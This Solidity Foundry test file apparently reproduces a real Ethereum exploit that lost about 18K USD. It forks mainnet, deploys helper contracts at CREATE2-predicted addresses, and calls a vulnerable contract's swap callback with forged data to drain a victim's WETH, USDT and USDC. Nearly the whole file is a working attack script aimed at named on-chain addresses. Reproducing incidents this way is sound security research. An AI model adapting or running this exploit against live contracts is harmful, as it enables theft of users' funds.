
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~18K USD
// TX : https://app.blocksec.com/explorer/tx/eth/0x53334c36502bd022bd332f2aa493862fd8f722138d1989132a46efddcc6b04d4
// Attacker : https://etherscan.io/address/0x98250d30aed204e5cbb8fef7f099bc68dbc4b896
// Attack Contract : https://etherscan.io/address/0xe10b2cfa421d0ecd5153c7a9d53dad949e1990dd
// GUY : https://x.com/SlowMist_Team/status/1815656653100077532

library DATA {
    struct SwapData {
        address vuln;
        address factory;
        bytes32 codehash;
        bytes   data;
    }
}
interface IMoney{
    function attack(address,address,uint256)external;
}
interface IContractTest{
    function getcodehash()external returns(bytes32);
    function cal_address(bytes32 hash) external returns(address);
}
contract ContractTest is Test {
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address Victim=0x0000000000E715268E0fe41ced1dd101Fc696355;
    address public VulnContract=0xDd7c2987686B21f656F036458C874D154A923685;
    function setUp() public {
        vm.createSelectFork("mainnet", 20367788);
    }

    function testExpolit() public {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), USDT.decimals());
        emit log_named_decimal_uint("[Begin] Attacker USDC before exploit", USDC.balanceOf(address(this)), USDC.decimals());
        bytes32 A_hash=keccak256(abi.encode(address(WETH), address(WETH),uint256(0)));
        address A=create_contract(A_hash);
        uint256 A_balance=WETH.balanceOf(address(Victim));
        IMoney(A).attack(address(Victim),address(WETH),A_balance);

        bytes32 B_hash=keccak256(abi.encode(address(USDT), address(USDT),uint256(0)));
        address B=create_contract(B_hash);
        uint256 B_balance=USDT.balanceOf(address(Victim));
        IMoney(B).attack(address(Victim),address(USDT),B_balance);

        bytes32 C_hash=keccak256(abi.encode(address(USDC), address(USDC),uint256(0)));
        address C=create_contract(C_hash);
        uint256 C_balance=USDC.balanceOf(address(Victim));
        IMoney(C).attack(address(Victim),address(USDC),C_balance);
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), USDT.decimals());
        emit log_named_decimal_uint("[End] Attacker USDC after exploit", USDC.balanceOf(address(this)), USDC.decimals());

    }
    function getcodehash()public returns(bytes32){
        return keccak256(type(Money).creationCode);
    }
       function create_contract(bytes32 tokenhash) internal returns(address){
            bytes memory bytecode = type(Money).creationCode;
            bytes32 _salt = tokenhash;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt,keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            return hack_contract;
    }
    fallback()payable external{}
}

contract Money  is Test{
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address other=0xF929bA2AEec16cFfcfc66858A9434E194BAaf80D;
    address public VulnContract=0xDd7c2987686B21f656F036458C874D154A923685;
    address public owner;

    constructor() {
        owner=msg.sender;
    }
    function attack(address vuln,address token,uint256 amount) public {
        bytes32 codehash=IContractTest(owner).getcodehash();
        DATA.SwapData memory datas = DATA.SwapData({
            vuln: address(vuln),
            factory: address(owner),
            codehash: codehash,
            data:abi.encodePacked(address(token), hex"000000", address(token))
        });
        bytes memory data=abi.encode(datas);
        VulnContract.call(abi.encodeWithSelector(bytes4(0xfa461e33), -1,amount,data));
        WETH.transfer(address(owner),WETH.balanceOf(address(this)));
        address(USDT).call(abi.encodeWithSelector(bytes4(0xa9059cbb),address(owner),USDT.balanceOf(address(this))));
        USDC.transfer(address(owner),USDC.balanceOf(address(this)));
    }
 fallback() external payable {

    }
}